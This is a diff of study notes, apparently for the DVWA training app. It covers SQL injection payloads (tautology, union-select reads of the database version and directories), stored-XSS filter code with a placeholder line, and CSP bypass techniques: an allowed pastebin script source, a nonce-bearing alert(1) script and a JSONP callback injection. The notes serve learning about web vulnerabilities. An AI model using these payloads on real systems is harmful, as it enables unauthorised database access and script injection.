@@ -100,7 +100,7 @@ Insecure CAPTCHA
 	
 SQL Injection
 	$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; 
-		2" or 1=1 -- +
+		2' or 1=1 -- +
 		1' union all select @@datadir,@@basedir#
 		1' order by 2 #
 		1' union select version(),database() #
@@ -156,5 +156,35 @@ XSS (Reflected)
 	$name = htmlspecialchars( $_GET[ 'name' ] ); 
 	
 XSS (Stored)
+	$message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? xx:xx;
+	$name = str_replace( '<script>', '', $name ); 
+	$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
+	
+	$message = htmlspecialchars( $message ); 
+	
 CSP Bypass
+	<meta http-equiv="Content-Security-Policy" content="script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:">
+		script-src，脚本：只信任当前域名
+		object-src：不信任任何URL，即不加载任何资源
+		style-src，样式表：只信任cdn.example.org和third-party.org
+		child-src：必须使用HTTPS协议加载。这个已从Web标准中删除，新版本浏览器可能不支持。
+   
+	Content-Security-Policy:script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';
+		‘unsafe-inline’：允许执行页面内嵌的<script>标签和事件监听函数
+		unsafe-eval：允许将字符串当作代码执行，比如使用eval、setTimeout、setInterval和Function等函数。
+		nonce值：每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个token，才会执行
+		hash值：列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行。
+		
+	$headerCSP = "Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com ;"; 
+		https://pastebin.com/raw/pEW2utRP
+	$headerCSP = "Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';";
+		<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>
+	$headerCSP = "Content-Security-Policy: script-src 'self';";
+	function clickButton() {} 
+		-> vulnerabilities/csp/source/high.js 
+			-> <script src="http://192.168.0.110:5678/vulnerabilities/csp/source/jsonp.php?callback=solveSum"></script>
+		callback=alert(1)
+	
 JavaScript
+
+	https://blog.csdn.net/weixin_42555985/article/details/88641118
